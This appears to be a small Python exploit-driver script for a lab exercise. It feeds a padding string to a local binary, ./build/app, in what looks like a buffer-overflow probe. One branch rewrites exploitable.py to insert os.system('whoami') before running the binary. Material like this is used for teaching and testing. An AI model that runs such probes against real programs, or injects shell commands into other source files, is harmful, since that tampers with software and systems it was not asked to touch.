import os
import sys


def first():
    exploit_string = "./build/app " + "A" * 10 + "B" * 4
    os.system(exploit_string)


def second():
    exploit_string = "python -c 'print(1)' | ./build/app " + "A" * 10 + "B" * 4
    lines = []
    with open("exploitable.py", "r") as f:
        lines = f.readlines()
    with open("exploitable.py", "w") as f:
        for i in range(len(lines)):
            if i == len(lines) - 1:
                f.write("    os.system('whoami')\n")
                f.write(lines[i])
            else:
                f.write(lines[i])
    os.system(exploit_string)


def third():
    exploit_string = "python -c 'print(1)' | ./build/app " + "A" * 10 + "B" * 4
    os.system(exploit_string)


if len(sys.argv) == 2:
    if sys.argv[1] == "2":
        second()
    elif sys.argv[1] == "3":
        third()
    else:
        first()
else:
    first()
